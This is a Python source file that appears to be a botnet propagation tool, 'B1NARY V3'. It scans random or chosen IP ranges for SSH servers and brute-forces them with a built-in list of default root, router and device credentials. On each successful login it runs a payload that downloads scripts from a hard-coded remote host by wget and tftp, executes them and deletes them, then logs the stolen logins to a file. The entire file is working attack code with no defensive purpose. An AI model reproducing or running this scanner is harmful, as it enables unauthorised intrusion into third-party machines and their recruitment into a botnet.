#!/usr/bin/env python
# -*- coding: utf-8 -*-
#MUST INSTALL PARAMIKO
#yum install python-paramiko -y
"""
Usage: python b1naryv3.py [threads] [A|B|C|BRAZIL|SUPER|LUCKY|LUCKY2|RAND|INTERNET] [IPRANGE] [1|2|routers|perl|ubuntu|root|vps1|vps2|vps3|r00ted]
Skype: b1narythag0d
XMPP: b1nary@darkness.su
Made Date: 7-2-16
"""
"""

# ___     __________  ____ _______      _____ _______________.___.  ___     
# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\ 
# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/ 
#           |    |   \ |   /    |    \/    |    \    |   \\____   |          
#           |______  / |___\____|__  /\____|__  /____|_  // ______|          
#                  \/              \/         \/       \/ \/                 
							***B1NARY V3***
"""
import threading, paramiko, random, socket, time, sys, os
usage='python b1naryv3.py [threads] [A|B|C|BRAZIL|SUPER|LUCKY|LUCKY2|RAND|INTERNET] [IPRANGE] [1|2|routers|perl|ubuntu|root|vps1|vps2|vps3|r00ted]'
if len(sys.argv) < 4:
        sys.exit(usage)
os.system("echo -e 'ulimit -s 999999; ulimit -n 999999; ulimit -u 999999\n' > ~/.bashrc")
os.system("ulimit -s 999999; ulimit -n 999999; ulimit -u 999999")
paramiko.util.log_to_file("/dev/null")
os.system("sysctl -w fs.file-max=999999 >/dev/null")

"""
████████▄     ▄████████    ▄████████  ▄█  ███▄▄▄▄      ▄████████    ▄████████ 
███   ▀███   ███    ███   ███    ███ ███  ███▀▀▀██▄   ███    ███   ███    ███ 
███    ███   ███    █▀    ███    █▀  ███▌ ███   ███   ███    █▀    ███    █▀  
███    ███  ▄███▄▄▄      ▄███▄▄▄     ███▌ ███   ███  ▄███▄▄▄       ███        
███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀     ███▌ ███   ███ ▀▀███▀▀▀     ▀███████████ 
███    ███   ███    █▄    ███        ███  ███   ███   ███    █▄           ███ 
███   ▄███   ███    ███   ███        ███  ███   ███   ███    ███    ▄█    ███ 
████████▀    ██████████   ███        █▀    ▀█   █▀    ██████████  ▄████████▀                                                                           
"""
cmd='cd /tmp || cd /var/run;wget http://148.163.83.79/bin.sh;sh bin.sh;rm -rf bin.sh;tftp -r bint1.sh -g 148.163.83.79;sh bint1.sh; tftp 148.163.83.79 -c get bint2.sh; sh bint2.sh; rm -rf bint1.sh bint2.sh bin.sh\r\n' #PAYLOAD
blacklist = [
    '127'
]
passwords = [ 
	"root:root",
	"root:toor",
	"root:admin",
	"root:1234",
	"root:maxided",
	"root:pi",
	"root:alpine",
	"root:r00tnull3d",
	"root:r00tnull3d#",
	"root:rootnull3d#",
	"root:password",
	"root:centos6svm",
	"root:1234",
    "root:123456",
    "root:Love2020",
    "root:Zero",
    "root:Password",
    "root:password",
    "root:qwerty",
    "root:dragon",
    "root:pussy",
    "root:baseball",
    "root:football",
    "root:monkey",
    "root:696969",
    "root:abc123"
	"admin:admin",
	"admin:1234",
	"admin:Guest",
	"ubnt:ubnt",
	"guest:guest",
	"user:user",
	"test:test",
	"pi:raspberry",
	"vagrant:vagrant",
	"localhost:root",
	"B1NARY:B1NARY",
	"tim:tim",
	"CISCO:CISCO",
	"netgear"
	"support:support",
	"oracle:oracle",
	"cusadmin:password",
]

"""
 ▄█     ▄███████▄         ▄████████    ▄████████    ▄██████▄  ███▄▄▄▄      ▄████████    ▄████████ 
███    ███    ███        ███    ███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███ 
███▌   ███    ███        ███    ███   ███    ███   ███    █▀  ███   ███   ███    █▀    ███    █▀  
███▌   ███    ███       ▄███▄▄▄▄██▀   ███    ███  ▄███        ███   ███  ▄███▄▄▄       ███        
███▌ ▀█████████▀       ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███ ████▄  ███   ███ ▀▀███▀▀▀     ▀███████████ 
███    ███             ▀███████████   ███    ███   ███    ███ ███   ███   ███    █▄           ███ 
███    ███               ███    ███   ███    ███   ███    ███ ███   ███   ███    ███    ▄█    ███ 
█▀    ▄████▀             ███    ███   ███    █▀    ████████▀   ▀█   █▀    ██████████  ▄████████▀  
                         ███    ███                                                               
"""
br = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
yeet = ["122","131","161","37","186","187","31","188","201","2","200"]
lucky = ["125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52","180.180"]
lucky2 = ["119.91","119.92","119.93","113.53"]
lol = ["1","2","5","119","180","113","125","122","46","101",""]
load = ["125.25","125.26","125.27","119.92","119.93","180.180","113.53","185.52"]

"""
   ▄███████▄    ▄████████    ▄████████    ▄████████       ▄████████  ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄   ▄██████▄     ▄████████ 
  ███    ███   ███    ███   ███    ███   ███    ███      ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███    ███   ███    ███ 
  ███    ███   ███    ███   ███    █▀    ███    █▀       ███    █▀  ███    ███ ███   ███   ███   ███    ███ ███    ███   ███    █▀  
  ███    ███   ███    ███   ███          ███             ███        ███    ███ ███   ███   ███  ▄███▄▄▄██▀  ███    ███   ███        
▀█████████▀  ▀███████████ ▀███████████ ▀███████████      ███        ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  ███    ███ ▀███████████ 
  ███          ███    ███          ███          ███      ███    █▄  ███    ███ ███   ███   ███   ███    ██▄ ███    ███          ███ 
  ███          ███    ███    ▄█    ███    ▄█    ███      ███    ███ ███    ███ ███   ███   ███   ███    ███ ███    ███    ▄█    ███ 
 ▄████▀        ███    █▀   ▄████████▀   ▄████████▀       ████████▀   ▀██████▀   ▀█   ███   █▀  ▄█████████▀   ▀██████▀   ▄████████▀                                                                                                                                  
"""

if sys.argv[4] == '1':
    passwords = ["root:root", "root:admin", "admin:1234"]
if sys.argv[4] == '2':
	passwords = ["root:root", "root:toor", "root:admin", "admin:1234", "oracle:oracle", "root:alpine"]
if sys.argv[4] == 'routers':
	passwords = ["root:admin", "root:root", "admin:1234", "admin:password", "cisco:cisco", "netgear:netgear", "cusadmin:password"]
if sys.argv[4] == 'perl':
    passwords = [ "pi:raspberry", "vagrant:vagrant", "ubnt:ubnt" ]
if sys.argv[4] == 'ubuntu':
    passwords = [ "ubnt:ubnt", "ubnt:1234", "ubnt:password" ]
if sys.argv[4] == 'root':
    passwords = [ "root:root","root:test" ]
if sys.argv[4] == 'vps1':
	passwords = [ "root:maxided", "root:centos6svm", "root:123456", "root:Love2020", "root:Zero", "root:Password", "root:password"]
if sys.argv[4] == 'vps2':
	passwords = [ "root:maxided", "root:centos6svm", "root:1234", "root:qwerty", "root:dragon", "root:pussy", "root:baseball"]
if sys.argv[4] == 'vps3':
	passwords = [ "root:maxided", "root:centos6svm", "root:football", "root:monkey", "root:696969", "root:abc123"]
if sys.argv[4] == 'r00ted':
	passwords = [ "localhost:root", "B1NARY:B1NARY", "root:r00tnull3d#", "root:Flunzy2016", "bash:root"]
if sys.argv[4] == 'brute':
	passwords = [ "root:centos6svm", "root:root", "root:toor", "root:abc123", "root:maxided"]
if sys.argv[4] == 'lol':
	passwords = [ "admin:1234"]

"""
 ▄█     ▄███████▄       ▄████████  ▄█          ▄████████    ▄████████    ▄████████    ▄████████    ▄████████ 
███    ███    ███      ███    ███ ███         ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ 
███▌   ███    ███      ███    █▀  ███         ███    ███   ███    █▀    ███    █▀    ███    █▀    ███    █▀  
███▌   ███    ███      ███        ███         ███    ███   ███          ███         ▄███▄▄▄       ███        
███▌ ▀█████████▀       ███        ███       ▀███████████ ▀███████████ ▀███████████ ▀▀███▀▀▀     ▀███████████ 
███    ███             ███    █▄  ███         ███    ███          ███          ███   ███    █▄           ███ 
███    ███             ███    ███ ███▌    ▄   ███    ███    ▄█    ███    ▄█    ███   ███    ███    ▄█    ███ 
█▀    ▄████▀           ████████▀  █████▄▄██   ███    █▀   ▄████████▀   ▄████████▀    ██████████  ▄████████▀  
                                  ▀                                                                          
"""
ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
"""
   ▄████████    ▄████████    ▄█    █▄            ▄████████  ▄████████    ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████    ▄████████ 
  ███    ███   ███    ███   ███    ███          ███    ███ ███    ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███   ███    ███ 
  ███    █▀    ███    █▀    ███    ███          ███    █▀  ███    █▀    ███    ███ ███   ███ ███   ███   ███    █▀    ███    ███ 
  ███          ███         ▄███▄▄▄▄███▄▄        ███        ███          ███    ███ ███   ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀███████████ ▀███████████ ▀▀███▀▀▀▀███▀       ▀███████████ ███        ▀███████████ ███   ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
         ███          ███   ███    ███                 ███ ███    █▄    ███    ███ ███   ███ ███   ███   ███    █▄  ▀███████████ 
   ▄█    ███    ▄█    ███   ███    ███           ▄█    ███ ███    ███   ███    ███ ███   ███ ███   ███   ███    ███   ███    ███ 
 ▄████████▀   ▄████████▀    ███    █▀          ▄████████▀  ████████▀    ███    █▀   ▀█   █▀   ▀█   █▀    ██████████   ███    ███ 
                                                                                                                      ███    ███ 
"""
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "BRAZIL":
                        self.host = random.choice(br)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "SUPER":
                        self.host = random.choice(yeet)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY":
                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY2":
                        self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "RAND":
                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "INTERNET":
                        self.host = random.choice(lol)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
		    elif ipclassinfo == "LOAD":
						self.host = random.choice(load)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    else:
                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print '\x1b[31mINFECTING:'+self.host+'|'+username+'|'+password+'|'+str(port)
                        ssh.exec_command(""+cmd+"")
                        time.sleep(20)
                        ssh.close()
			open("infected.txt","a").write(username+":"+password+":"+self.host+"\n")
            except:
                pass

for x in range(0,int(sys.argv[1])):
    try:
        t = sshscanner()
        t.start()
    except:
        pass
